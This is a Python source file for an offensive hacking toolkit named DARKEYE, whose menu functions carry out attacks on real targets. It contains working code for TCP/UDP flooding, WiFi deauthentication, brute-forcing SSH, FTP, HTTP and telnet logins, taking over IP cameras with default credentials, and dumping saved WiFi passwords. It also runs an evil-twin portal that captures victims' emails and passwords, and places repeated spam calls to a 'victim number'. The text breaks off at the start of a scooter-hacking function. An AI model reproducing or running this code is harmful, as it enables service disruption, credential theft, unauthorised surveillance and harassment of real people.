#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================
  D A R K E Y E   ::  v3.3
----------------------------------------------------------------
  pip install requests phonenumbers pillow paramiko bleak bless
  Admin rights: WiFi / Fake WiFi / BLE / camera.
  Press Enter to skip the intro.
================================================================
"""

import os
import sys
import time
import json
import random
import shutil
import socket
import threading
import subprocess
import platform
import re
from datetime import datetime

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
if os.name == "nt":
    os.system("")

# --- RED THEME ---------------------------------------------------------------
R = "\033[0m"; B = "\033[1m"; DIM = "\033[2m"
RD = "\033[91m"; DR = "\033[31m"; WH = "\033[97m"; GY = "\033[90m"

IS_WIN = os.name == "nt"
IS_LIN = sys.platform.startswith("linux")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except Exception:
    requests = None

try:
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone as pn_tz
except Exception:
    phonenumbers = None

# ============================================================================
#  HELPERS
# ============================================================================
W = lambda: shutil.get_terminal_size().columns
H = lambda: shutil.get_terminal_size().lines
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

def clear():
    os.system("cls" if IS_WIN else "clear")

def center(s):
    w = W()
    return "\n".join(l.center(w) for l in s.split("\n"))

def cprint(txt="", color="", end="\n"):
    print(color + txt + R, end=end)

def hr(ch="─", color=DR):
    cprint(ch * W(), color)

def ask(prompt, default=""):
    try:
        v = input(f"{RD}┃ {R}{prompt}{f' [{default}]' if default else ''}: ").strip()
    except EOFError:
        return default
    return v or default

def pause():
    try:
        input(f"\n{GY}[ Enter ]{R} ")
    except EOFError:
        pass

def need(pkg, mod=None):
    mod = mod or pkg
    try:
        return __import__(mod)
    except Exception:
        cprint(f"[!] Missing module '{pkg}'.", RD)
        if ask("Install now? (y/n)", "y").lower() == "y":
            subprocess.call([sys.executable, "-m", "pip", "install", "-q", pkg])
            try:
                return __import__(mod)
            except Exception:
                cprint("[x] Install failed.", RD)
        return None

def title(txt):
    clear()
    hr("═", DR)
    cprint(center(txt), B + RD)
    hr("═", DR)

def port_open(ip, port, t=0.6):
    s = socket.socket(); s.settimeout(t)
    try:
        return s.connect_ex((ip, port)) == 0
    finally:
        s.close()

def key_hit():
    if IS_WIN:
        try:
            import msvcrt
            return msvcrt.kbhit() and (msvcrt.getch() is not None)
        except Exception:
            return False
    try:
        import select
        return select.select([sys.stdin], [], [], 0)[0] != []
    except Exception:
        return False

# ============================================================================
#  ASSETS
# ============================================================================
BANNER = [
    r"▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀▓█████▓██   ██▓▓█████",
    r"▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ ▓█   ▀ ▒██  ██▒▓█   ▀",
    r"░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ ▒███    ▒██ ██░▒███  ",
    r"░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ ▒▓█  ▄  ░ ▐██▓░▒▓█  ▄",
    r"░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄░▒████▒ ░ ██▒▓░░▒████▒",
    r" ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░",
    r" ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░ ░ ░  ░▓██ ░▒░  ░ ░  ░",
    r" ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░    ░   ▒ ▒ ░░     ░   ",
    r"   ░          ░  ░   ░     ░  ░      ░  ░░ ░        ░  ░",
    r" ░                                       ░ ░            ",
]

# "injectorX69" - overlay art
ART = [
    " ,,                       ,,              ,,",
    "*MM                       db              db                    mm                `YMM'   `MP'   .6*\"",
    " MM                                                             MM                  VMb.  ,P   ,M'",
    " MM,dMMb.`7M'   `MF'    `7MM  `7MMpMMMb.`7MM  .gP\"Ya   ,p6\"bo mmMMmm ,pW\"Wq.`7Mb,od8 `MM.M'   ,Mbmmm.    .d*\"*bg.",
    " MM    `Mb VA   ,V        MM    MM    MM  MM ,M'   Yb 6M'  OO   MM  6W'   `Wb MM' \"'   MMb    6M'  `Mb. 6MP    Mb",
    " MM     M8  VA ,V         MM    MM    MM  MM 8M\"\"\"\"\"\" 8M        MM  8M     M8 MM     ,M'`Mb.  MI     M8 YMb    MM",
    " MM.   ,M9   VVV          MM    MM    MM  MM YM.    , YM.    ,  MM  YA.   ,A9 MM    ,P   `MM. WM.   ,M9  `MbmmdM9",
    " P^YbmdP'    ,V         .JMML..JMML  JMML.MM  `Mbmmd'  YMbmd'   `Mbmo`Ybmd9'.JMML..MM:.  .:MMa.WMbmmd9        .M'",
    "            ,V                         QO MP                                                                .d9",
    "         OOb\"                          `bmP                                                               m\"'",
]
BY_LABEL = "By injectorX69"

MATRIX_CHARS = "ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ0123456789:=*+-<>"

# ============================================================================
#  INTRO
# ============================================================================
def _mcolor(lvl):
    if lvl == -1:
        return B + RD
    if lvl == 0:
        return B + WH
    if lvl < 3:
        return RD
    if lvl < 7:
        return DR
    return DIM + DR

def _stamp(grid, text, row, left, lvl, w, h):
    if not (0 <= row < h):
        return
    for i, ch in enumerate(text):
        x = left + i
        if 0 <= x < w and ch != " ":
            grid[row][x] = (ch, lvl)

def intro():
    skip = [False]

    def watch():
        while not skip[0]:
            if key_hit():
                skip[0] = True
                return
            time.sleep(0.02)

    threading.Thread(target=watch, daemon=True).start()

    try:
        w = max(30, W())
        h = max(14, H() - 1)
    except Exception:
        return

    heads = [random.uniform(-h, 0) for _ in range(w)]
    speeds = [random.uniform(0.35, 1.5) for _ in range(w)]
    trail = 11
    blockw = max(len(l) for l in ART)
    left = max(0, (w - blockw) // 2)
    art_top = max(1, (h - len(ART)) // 2)

    t0 = time.time()
    dur = 4.2
    sys.stdout.write("\033[?25l")
    try:
        while time.time() - t0 < dur:
            if skip[0]:
                break
            grid = [[None] * w for _ in range(h)]
            for x in range(w):
                heads[x] += speeds[x]
                if heads[x] - trail > h:
                    heads[x] = random.uniform(-trail, 0)
                    speeds[x] = random.uniform(0.35, 1.5)
                head = int(heads[x])
                for k in range(trail):
                    y = head - k
                    if 0 <= y < h and random.random() < 0.8:
                        grid[y][x] = (random.choice(MATRIX_CHARS), k)

            if time.time() - t0 > 0.7:
                lbl_left = max(0, (w - len(BY_LABEL)) // 2)
                _stamp(grid, BY_LABEL, art_top - 2, lbl_left, -1, w, h)
                for i, line in enumerate(ART):
                    _stamp(grid, line.ljust(blockw), art_top + i, left, 0, w, h)

            buf = ["\033[H"]
            for y in range(h):
                parts = []
                for x in range(w):
                    c = grid[y][x]
                    parts.append(" " if c is None else _mcolor(c[1]) + c[0] + R)
                buf.append("".join(parts))
            sys.stdout.write("".join(buf))
            sys.stdout.flush()
            time.sleep(0.045)
    except Exception:
        pass
    finally:
        sys.stdout.write("\033[?25h")
    time.sleep(0.15)

# ============================================================================
#  1. IP TRACER
# ============================================================================
def _geo(ip):
    if requests is None:
        return None
    try:
        d = requests.get(f"http://ip-api.com/json/{ip}", params={
            "fields": "status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting"
        }, timeout=8).json()
        if d.get("status") == "success":
            return {"IP": d.get("query"), "Country": f"{d.get('country')} ({d.get('countryCode')})",
                    "Region": d.get("regionName"), "City": d.get("city"), "ZIP": d.get("zip"),
                    "Timezone": d.get("timezone"), "ISP": d.get("isp"), "Org": d.get("org"),
                    "ASN": d.get("as"), "Mobile": d.get("mobile"), "Proxy": d.get("proxy"),
                    "Hosting": d.get("hosting"), "_ll": (d.get("lat"), d.get("lon"))}
    except Exception:
        pass
    try:
        d = requests.get(f"https://ipapi.co/{ip}/json/", timeout=8, headers=UA).json()
        if not d.get("error"):
            return {"IP": d.get("ip"), "Country": f"{d.get('country_name')} ({d.get('country_code')})",
                    "Region": d.get("region"), "City": d.get("city"), "ZIP": d.get("postal"),
                    "Timezone": d.get("timezone"), "ISP": d.get("org"), "Org": d.get("org"),
                    "ASN": d.get("asn"), "_ll": (d.get("latitude"), d.get("longitude"))}
    except Exception:
        pass
    try:
        d = requests.get(f"https://ipinfo.io/{ip}/json", timeout=8, headers=UA).json()
        if d.get("ip"):
            ll = (d.get("loc") or ",").split(",")
            return {"IP": d.get("ip"), "Country": d.get("country"), "Region": d.get("region"),
                    "City": d.get("city"), "ZIP": d.get("postal"), "Timezone": d.get("timezone"),
                    "ISP": d.get("org"), "Org": d.get("org"),
                    "_ll": (ll[0] if len(ll) > 1 else None, ll[1] if len(ll) > 1 else None)}
    except Exception:
        pass
    return None

def ip_tracer():
    title("1 // IP TRACER")
    target = ask("IP or domain")
    if not target:
        return
    try:
        ip = socket.gethostbyname(target)
    except Exception as e:
        cprint(f"[x] Invalid target: {e}", RD); return
    cprint(f"[*] {target} -> {ip}", DR)
    try:
        cprint(f"[*] PTR: {socket.gethostbyaddr(ip)[0]}", GY)
    except Exception:
        pass
    d = _geo(ip)
    if not d:
        cprint("[x] All geolocation providers failed.", RD); return
    hr()
    for k in ("IP", "Country", "Region", "City", "ZIP", "Timezone", "ISP", "Org", "ASN",
              "Mobile", "Proxy", "Hosting"):
        if d.get(k) not in (None, ""):
            cprint(f"  {k:<10}: {B}{WH}{d[k]}{R}")
    hr()
    lat, lon = d.get("_ll", (None, None))
    if lat and lon:
        cprint(f"  Map: https://www.google.com/maps?q={lat},{lon}", RD)

# ============================================================================
#  2. PHONE TRACER
# ============================================================================
def phone_tracer():
    title("2 // PHONE TRACER")
    raw = ask("Phone number (+420xxxxxxxxx)")
    if not raw:
        return
    if phonenumbers:
        try:
            n = phonenumbers.parse(raw if raw.startswith("+") else "+" + raw.lstrip("+"), None)
            if not phonenumbers.is_valid_number(n):
                cprint("[!] Number does not look valid, continuing.", DR)
            hr()
            cprint(f"  E.164     : {B}{WH}{phonenumbers.format_number(n, phonenumbers.PhoneNumberFormat.E164)}{R}")
            cprint(f"  National  : {phonenumbers.format_number(n, phonenumbers.PhoneNumberFormat.NATIONAL)}")
            cprint(f"  Country   : {geocoder.description_for_number(n, 'en') or '?'}")
            cprint(f"  Carrier   : {carrier.name_for_number(n, 'en') or '?'}")
            cprint(f"  Timezones : {', '.join(pn_tz.time_zones_for_number(n)) or '?'}")
            cprint(f"  Type      : {n.number_type}")
            hr()
        except Exception as e:
            cprint(f"[x] Parse error: {e}", RD)
    else:
        cprint("[!] 'phonenumbers' missing.", DR); cprint("    pip install phonenumbers", GY)
    digits = "".join(c for c in raw if c.isdigit())
    if requests:
        try:
            r = requests.get(f"https://wa.me/{digits}", timeout=8, allow_redirects=True, headers=UA)
            cprint(f"  WhatsApp  : {'EXISTS' if r.status_code == 200 else 'no response'}",
                   WH if r.status_code == 200 else DR)
        except Exception:
            pass
    cprint(f"  wa.me     : https://wa.me/{digits}", RD)
    cprint(f"  Search    : https://www.google.com/search?q=%22{digits}%22", RD)

# ============================================================================
#  3. / 4. DOS / DDOS
# ============================================================================
def _flood(host, port, proto, stop, counter):
    if proto == "udp":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(1200)
        while not stop.is_set():
            try:
                s.sendto(payload, (host, port)); counter[0] += 1
            except Exception:
                pass
        s.close()
    else:
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8); s.connect((host, port))
                s.send(b"GET / HTTP/1.1\r\nHost: t\r\nConnection: keep-alive\r\n\r\n")
                counter[0] += 1; s.close()
            except Exception:
                pass

def _flood_engine(name):
    title(name)
    host = ask("Host / IP")
    if not host:
        return
    port = int(ask("Port", "80"))
    proto = ask("Protocol tcp/udp", "tcp").lower()
    threads_n = int(ask("Threads", "80"))
    try:
        ip = socket.gethostbyname(host)
    except Exception as e:
        cprint(f"[x] {e}", RD); return
    cprint(f"\n[*] {ip}:{port}/{proto} x {threads_n} threads - Ctrl+C to stop", DR)
    stop = threading.Event(); counter = [0]
    for _ in range(threads_n):
        threading.Thread(target=_flood, args=(ip, port, proto, stop, counter), daemon=True).start()
    t0 = time.time()
    try:
        while True:
            time.sleep(0.4); el = time.time() - t0
            cprint(f"\r  packets: {counter[0]:>9}  {counter[0]/el:>8.0f} p/s  {el:>5.1f}s ", RD, end="")
    except KeyboardInterrupt:
        stop.set(); cprint(f"\n[+] Done. {counter[0]} packets in {time.time()-t0:.1f}s.", WH)

def dos():
    _flood_engine("3 // DOS")

def ddos():
    _flood_engine("4 // DDOS (multithread)")

# ============================================================================
#  5. WIFI DOS
# ============================================================================
def dos_wifi():
    title("5 // WIFI DOS")
    cprint("1) gateway ping flood   2) deauth (scapy, monitor mode)", DR)
    mode = ask("Mode", "1")
    gw = None
    try:
        if IS_WIN:
            out = subprocess.run(["ipconfig"], capture_output=True, text=True).stdout
            m = re.search(r"Default Gateway.*?:\s*([\d.]+)", out); gw = m.group(1) if m else None
        else:
            out = subprocess.run(["ip", "route"], capture_output=True, text=True).stdout
            m = re.search(r"default via ([\d.]+)", out); gw = m.group(1) if m else None
    except Exception:
        pass
    gw = ask("Gateway", gw or "192.168.1.1")
    if mode == "1":
        cprint(f"\n[*] Ping flood on {gw} - Ctrl+C to stop", DR)
        n = 0
        try:
            while True:
                subprocess.run(["ping", "-n" if IS_WIN else "-c", "1",
                                "-w" if IS_WIN else "-W", "150", gw], capture_output=True)
                n += 1; cprint(f"\r  pings: {n} ", RD, end="")
        except KeyboardInterrupt:
            cprint(f"\n[+] {n} pings.", WH)
    else:
        scapy = need("scapy", "scapy.all")
        if not scapy:
            return
        from scapy.all import sendp
        cprint("\n[!] Monitor mode required (airmon-ng start wlan0).", DR)
        ifc = ask("Interface", "wlan0mon"); bssid = ask("AP BSSID")
        if not bssid:
            return
        pkt = scapy.RadioTap() / scapy.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / scapy.Dot11Deauth(reason=7)
        n = 0
        cprint("[*] Deauth flood - Ctrl+C to stop", DR)
        try:
            while True:
                sendp(pkt, iface=ifc, verbose=False); n += 1
                cprint(f"\r  deauth: {n} ", RD, end="")
        except KeyboardInterrupt:
            cprint(f"\n[+] {n} frames.", WH)

# ============================================================================
#  6. BLE SPAM
# ============================================================================
def ble_spam():
    title("6 // BLE SPAM")
    bless = need("bless", "bless")
    if not bless:
        return
    from bless import BlessServer, GATTCharacteristicProperties, GATTAttributePermissions
    payloads = ["AirPods Pro", "AirPods Max", "Galaxy Buds", "Beats Studio", "Windows Update"]
    name = ask("Broadcast name", random.choice(payloads))
    dur = int(ask("Duration (s)", "30"))
    import asyncio

    async def run():
        server = BlessServer(name=name)
        async def read(c, *a): return c.value
        async def write(c, v): c.value = v
        server.read_request_func = read; server.write_request_func = write
        await server.add_new_characteristic("0000ffe1-0000-1000-8000-00805f9b34fb", 0,
                                            GATTCharacteristicProperties.read, b"\x00",
                                            GATTAttributePermissions.readable)
        await server.start()
        cprint(f"[+] Advertising as '{name}' ({dur}s)", WH)
        await asyncio.sleep(dur)
        await server.stop()

    try:
        asyncio.run(run()); cprint("[+] Stopped.", WH)
    except Exception as e:
        cprint(f"[x] {e}", RD)

# ============================================================================
#  7. CAMERA HACK
# ============================================================================
CAM_PATHS = ["/snapshot.jpg", "/image/jpeg", "/jpg/image.jpg", "/snapshot.cgi",
             "/videostream.cgi", "/cgi-bin/snapshot.cgi", "/ISAPI/Streaming/channels/101/picture",
             "/axis-cgi/jpg/image.cgi", "/tmpfs/auto.jpg", "/onvif-http/snapshot",
             "/cgi-bin/currentpic.cgi", "/img/snapshot.cgi", "/snap.jpg"]
CAM_CREDS = [("admin", "admin"), ("admin", ""), ("admin", "12345"), ("admin", "password"),
             ("admin", "1234"), ("admin", "123456"), ("root", "root"), ("root", "admin"),
             ("root", "12345"), ("admin", "admin123"), ("user", "user"), ("admin", "1111")]
CAM_PORTS = (80, 8080, 8000, 81, 88, 8081, 8001, 554, 8554)

def _snap(base, path, creds):
    for u, p in creds:
        try:
            r = requests.get(f"{base}{path}", auth=(u, p), timeout=3, verify=False, headers=UA)
            if r.status_code == 200 and r.content[:2] == b"\xff\xd8" and len(r.content) > 2000:
                return r.content, u, p
        except Exception:
            continue
    return None, None, None

def camera_hack():
    title("7 // CAMERA HACK")
    ip = ask("Camera IP")
    if not ip:
        return
    if requests is None:
        cprint("[x] requests missing.", RD); return
    cprint("[*] Probing ports...", DR)
    live = [p for p in CAM_PORTS if port_open(ip, p)]
    if not live:
        cprint("[x] No response.", RD); return
    cprint(f"[+] Open: {live}", WH)

    creds = list(CAM_CREDS)
    extra = ask("Custom creds (user:pass, comma separated)", "")
    if extra:
        for pair in extra.split(","):
            if ":" in pair:
                u, _, p = pair.partition(":")
                creds.insert(0, (u.strip(), p.strip()))

    found = None
    for port in live:
        for scheme in ("http", "https"):
            base = f"{scheme}://{ip}:{port}"
            for path in CAM_PATHS:
                data, u, p = _snap(base, path, creds)
                if data:
                    found = (base, path, u, p, data); break
            if found:
                break
        if found:
            break

    if not found:
        if 554 in live or 8554 in live:
            rp = 554 if 554 in live else 8554
            cprint(f"[!] RTSP open: rtsp://{ip}:{rp}/  (open in VLC)", DR)
        else:
            cprint("[x] No snapshot endpoint matched.", RD)
        return

    base, path, u, p, data = found
    cprint(f"[+] Logged in {u}:{p} -> {base}{path}", WH)

    PIL = need("pillow", "PIL")
    if not PIL:
        fn = f"snap_{int(time.time())}.jpg"; open(fn, "wb").write(data)
        cprint(f"[i] Saved: {fn}", DR); return

    import tkinter as tk
    from PIL import Image, ImageTk
    import io
    root = tk.Tk(); root.title("DARK EYE"); root.configure(bg="black")
    lbl = tk.Label(root, bg="black"); lbl.pack()
    info = tk.Label(root, text=f"{base}{path} | {u}:{p}", fg="red", bg="black"); info.pack(fill="x")

    def refresh():
        try:
            r = requests.get(f"{base}{path}", auth=(u, p), timeout=3, verify=False, headers=UA)
            img = Image.open(io.BytesIO(r.content)); img.thumbnail((900, 600))
            ph = ImageTk.PhotoImage(img); lbl.configure(image=ph); lbl.image = ph
        except Exception:
            info.configure(text="stream lost, retrying...")
        root.after(200, refresh)

    refresh(); root.mainloop()

# ============================================================================
#  8. WHATSAPP
# ============================================================================
def whatsapp():
    title("8 // WHATSAPP")
    cprint("1) Number check   2) WhatsApp Web session (Selenium)", DR)
    if ask("Choice", "1") == "2":
        if not need("selenium", "selenium"):
            return
        from selenium import webdriver
        d = webdriver.Chrome(); d.get("https://web.whatsapp.com")
        cprint("[*] Scan the QR, then press Enter.", DR); pause()
        try:
            d.execute_script("window.open('')")
            cprint("[+] Session active.", WH)
        except Exception as e:
            cprint(f"[x] {e}", RD)
        pause(); return
    num = "".join(c for c in ask("Number (+420...)") if c.isdigit() or c == "+").lstrip("+")
    if not num:
        return
    if requests:
        try:
            r = requests.get(f"https://wa.me/{num}", timeout=8, allow_redirects=True, headers=UA)
            ok = r.status_code == 200
            cprint(f"[+] Number {'is' if ok else 'is not / cannot verify'} on WhatsApp", WH if ok else DR)
        except Exception as e:
            cprint(f"[x] {e}", RD)
    cprint(f"[i] https://wa.me/{num}", RD)

# ============================================================================
#  9. WIFI SCAN
# ============================================================================
def wifi_scan():
    title("9 // WIFI SCAN")
    if IS_WIN:
        out = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"],
                             capture_output=True, text=True, encoding="utf-8", errors="replace").stdout
        blocks = re.split(r"SSID \d+\s*:", out)[1:]
        rows = []
        for b in blocks:
            name = b.splitlines()[0].strip()
            sig = re.search(r"Signal\s*:\s*(\d+)", b)
            ch = re.search(r"Channel\s*:\s*(\d+)", b)
            au = re.search(r"Authentication\s*:\s*(.+)", b)
            rows.append((name, int(sig.group(1)) if sig else 0,
                         ch.group(1) if ch else "?", au.group(1).strip() if au else "?"))
    elif IS_LIN:
        out = subprocess.run(["nmcli", "-f", "SSID,CHAN,SIGNAL,SECURITY", "dev", "wifi"],
                             capture_output=True, text=True).stdout
        rows = []
        for line in out.splitlines()[1:]:
            parts = re.split(r"\s{2,}", line.strip())
            if len(parts) >= 4:
                rows.append((parts[0], int(parts[2]) if parts[2].isdigit() else 0, parts[1], parts[3]))
    else:
        out = subprocess.run(["airport", "-s"], capture_output=True, text=True).stdout
        rows = [(l.split()[0], 0, "?", "?") for l in out.splitlines()[1:] if l.strip()]

    if not rows:
        cprint("[x] Nothing found (enable WiFi / run as admin).", RD); return
    rows.sort(key=lambda r: -r[1])
    hr()
    for name, sig, ch, au in rows:
        cprint(f"  {name[:30]:<32}{RD}{'█' * min(20, sig // 5):<20}{R} ch{ch:<4}{DR}{au}{R}")
    hr(); cprint(f"  total: {len(rows)}", GY)

# ============================================================================
#  10. WIFI PASSWORD DUMP
# ============================================================================
def wifi_password():
    title("10 // WIFI PASSWORD DUMP")
    if IS_WIN:
        out = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True,
                             text=True, encoding="utf-8", errors="replace").stdout
        profiles = re.findall(r"All User Profile\s*:\s*(.+)", out)
        if not profiles:
            cprint("[x] No saved profiles.", RD); return
        for prof in profiles:
            prof = prof.strip()
            d = subprocess.run(["netsh", "wlan", "show", "profile", prof, "key=clear"],
                               capture_output=True, text=True, encoding="utf-8", errors="replace").stdout
            m = re.search(r"Key Content\s*:\s*(.+)", d)
            cprint(f"  {B}{prof:<32}{R} -> {WH if m else DR}{m.group(1).strip() if m else '(no password)'}{R}")
    elif IS_LIN:
        out = subprocess.run(["nmcli", "-s", "-g", "NAME,802-11-wireless-security.psk",
                              "connection", "show"], capture_output=True, text=True).stdout
        if not out.strip():
            cprint("[x] Nothing (run as root).", RD); return
        for line in out.splitlines():
            name, _, psk = line.partition(":")
            cprint(f"  {B}{name:<32}{R} -> {WH if psk else DR}{psk or '(no password)'}{R}")
    else:
        cprint("[!] macOS: security find-generic-password -wa 'SSID'", DR)

# ============================================================================
#  11. PASSWORD BRUTE FORCE
# ============================================================================
DEFAULT_USERS = ["admin", "root", "user", "administrator", "pi", "ubuntu", "ftp", "support"]
BUILTIN = ["", "root", "admin", "toor", "123456", "password", "12345678", "qwerty",
           "letmein", "admin123", "pass", "test", "1234", "changeme", "raspberry",
           "default", "123456789", "iloveyou", "dragon", "monkey", "12345", "abc123",
           "adminadmin", "Password1", "welcome", "secret", "master", "cisco"]

def _t_ftp(h, p, u, pw):
    import ftplib
    try:
        f = ftplib.FTP(); f.connect(h, p, timeout=4); f.login(u, pw); f.quit(); return True
    except Exception:
        return False

def _t_ssh(h, p, u, pw):
    try:
        import paramiko
        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(h, port=p, username=u, password=pw, timeout=4, allow_agent=False, look_for_keys=False)
        c.close(); return True
    except Exception:
        return False

def _t_http(h, p, u, pw):
    try:
        return requests.get(f"http://{h}:{p}/", auth=(u, pw), timeout=4,
                            headers=UA).status_code not in (401, 403)
    except Exception:
        return False

def _t_telnet(h, p, u, pw):
    import telnetlib
    try:
        t = telnetlib.Telnet(h, p, timeout=4)
        t.read_until(b"login:", 3); t.write(u.encode() + b"\n")
        t.read_until(b"assword:", 3); t.write(pw.encode() + b"\n")
        res = t.read_until(b"$", 2) + t.read_until(b"#", 2) + t.read_until(b">", 2)
        t.close()
        return b"incorrect" not in res.lower()
    except Exception:
        return False

def password_brutal():
    title("11 // PASSWORD BRUTE FORCE")
    proto = ask("Protocol ftp/ssh/http/telnet", "ssh")
    host = ask("Host")
    if not host:
        return
    port = int(ask("Port", {"ftp": "21", "ssh": "22", "http": "80", "telnet": "23"}.get(proto, "22")))
    user = ask("User (empty = user list)", "root")
    wl = ask("Wordlist file (empty = builtin)", "")
    stop_first = ask("Stop at first hit? (y/n)", "y").lower() == "y"

    if wl and os.path.isfile(wl):
        words = [w.strip() for w in open(wl, encoding="utf-8", errors="ignore") if w.strip()]
    else:
        words = BUILTIN
        cprint(f"[i] Builtin list ({len(words)}).", DR)

    users = [user] if user else DEFAULT_USERS
    fn = {"ftp": _t_ftp, "ssh": _t_ssh, "http": _t_http, "telnet": _t_telnet}.get(proto, _t_ssh)
    if proto == "ssh":
        need("paramiko", "paramiko")
    if proto == "telnet":
        import telnetlib  # noqa

    cprint(f"\n[*] {len(users)} users x {len(words)} passwords -> {host}:{port}", DR)
    found, n = [], 0
    try:
        for u in users:
            for pw in words:
                n += 1
                cprint(f"\r  tried {n:<5} {u}:{pw or '(empty)':<18}", DR, end="")
                if fn(host, port, u, pw):
                    found.append((u, pw))
                    cprint(f"\r  {B}{WH}[+] {u}:{pw or '(empty)'}{R}" + " " * 25)
                    if stop_first:
                        raise StopIteration
    except (KeyboardInterrupt, StopIteration):
        pass
    hr()
    if found:
        cprint(f"[+] {len(found)} valid:", WH)
        for u, pw in found:
            cprint(f"    {u}:{pw or '(empty)'}", B + RD)
    else:
        cprint("[x] Nothing found.", RD)

# ============================================================================
#  12. FAKE WIFI
# ============================================================================
PORTAL = """<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1">
<title>{ssid}</title><style>
body{{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;display:flex;align-items:center;
justify-content:center;height:100vh;margin:0}}
.b{{background:#170b0b;padding:26px;border:1px solid #3a1010;border-radius:14px;width:300px;text-align:center}}
input{{width:100%;padding:11px;margin:7px 0;border-radius:8px;border:1px solid #3a1010;
background:#0a0505;color:#fff;box-sizing:border-box}}
button{{width:100%;padding:12px;border:0;border-radius:8px;background:#c62828;color:#fff;font-weight:700}}
h2{{margin:0 0 4px}}p{{color:#999;font-size:13px}}</style></head>
<body><div class=b><h2>{ssid}</h2><p>Sign in to get internet access</p>
<form method=POST action="/login"><input name=email placeholder="E-mail" required>
<input name=pass type=password placeholder="Password" required><button>Connect</button></form>
</div></body></html>"""

def fake_wifi():
    title("12 // FAKE WIFI (evil twin)")
    ssid = ask("Fake SSID", "Free WiFi")
    pw = ask("Network password (empty = open)", "")
    port = int(ask("Portal port", "80"))

    if IS_WIN:
        subprocess.run(["netsh", "wlan", "set", "hostednetwork", "mode=allow",
                        f"ssid={ssid}", f"key={pw or '12345678'}"], capture_output=True)
        r = subprocess.run(["netsh", "wlan", "start", "hostednetwork"], capture_output=True, text=True)
        txt = (r.stdout + r.stderr).strip()
        if "started" not in txt.lower():
            cprint("[!] hostednetwork failed - enable Mobile Hotspot manually.", DR)
            cprint("    Settings > Network > Mobile hotspot, name it: " + ssid, GY)
    elif IS_LIN:
        subprocess.run(["nmcli", "dev", "wifi", "hotspot", "ifname", "wlan0",
                        "ssid", ssid, "password", pw or "12345678"], capture_output=True)
    cprint(f"[+] Portal on 0.0.0.0:{port}", WH)

    from http.server import BaseHTTPRequestHandler, HTTPServer
    log = open("fakewifi_captured.txt", "a", encoding="utf-8")
    CAPTIVE = ("/generate_204", "/hotspot-detect.html", "/connecttest.txt",
               "/ncsi.txt", "/canonical.html", "/success.txt")

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a): pass

        def _redirect(self):
            self.send_response(302)
            self.send_header("Location", f"http://192.168.137.1:{port}/")
            self.end_headers()

        def do_GET(self):
            if self.path in CAPTIVE:
                return self._redirect()
            body = PORTAL.format(ssid=ssid).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self):
            from urllib.parse import parse_qs
            ln = int(self.headers.get("Content-Length", 0))
            q = parse_qs(self.rfile.read(ln).decode(errors="ignore"))
            e = q.get("email", [""])[0]; p = q.get("pass", [""])[0]
            line = f"{datetime.now():%Y-%m-%d %H:%M:%S} | {self.client_address[0]} | {e} | {p}"
            cprint(f"\n[+] CAPTURED: {line}", B + WH)
            log.write(line + "\n"); log.flush()
            self.send_response(302)
            self.send_header("Location", "https://www.google.com")
            self.end_headers()

    srv = HTTPServer(("0.0.0.0", port), H)
    cprint("[*] Waiting - Ctrl+C to stop", DR)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        cprint("\n[+] Stopped. Data in fakewifi_captured.txt", WH)

# ============================================================================
#  13. CALL SPAM
# ============================================================================
def call_spam():
    title("13 // CALL SPAM")
    sid = os.getenv("TWILIO_SID", ""); tok = os.getenv("TWILIO_TOKEN", ""); frm = os.getenv("TWILIO_FROM", "")
    if not (sid and tok and frm):
        cprint("[!] Missing Twilio vars:", DR)
        cprint("    set TWILIO_SID=ACxxx", GY); cprint("    set TWILIO_TOKEN=xxx", GY)
        cprint("    set TWILIO_FROM=+1xxx", GY); return
    to = ask("Victim number (+420...)")
    n = int(ask("Call count", "10")); delay = float(ask("Delay (s)", "12"))
    twiml = "http://demo.twilio.com/docs/voice.xml"
    ok_n = 0
    for i in range(1, n + 1):
        try:
            r = requests.post(f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Calls.json",
                              auth=(sid, tok), data={"To": to, "From": frm, "Url": twiml}, timeout=15)
            ok = r.status_code in (200, 201)
            ok_n += ok
            cprint(f"  [{i}/{n}] {'+' if ok else 'x ' + r.text[:60]}", WH if ok else RD)
        except Exception as e:
            cprint(f"  [{i}/{n}] {e}", RD)
        if i < n:
            time.sleep(delay)
    cprint(f"[+] {ok_n}/{n} placed.", WH)

# ============================================================================
#  14. SCOOT HACK
# ============================================================================
def scoot_hack():
    title("14 // SCOOT HACK")
    bleak = need("bleak", "bleak")
    if not bleak:
        return
    import asyncio
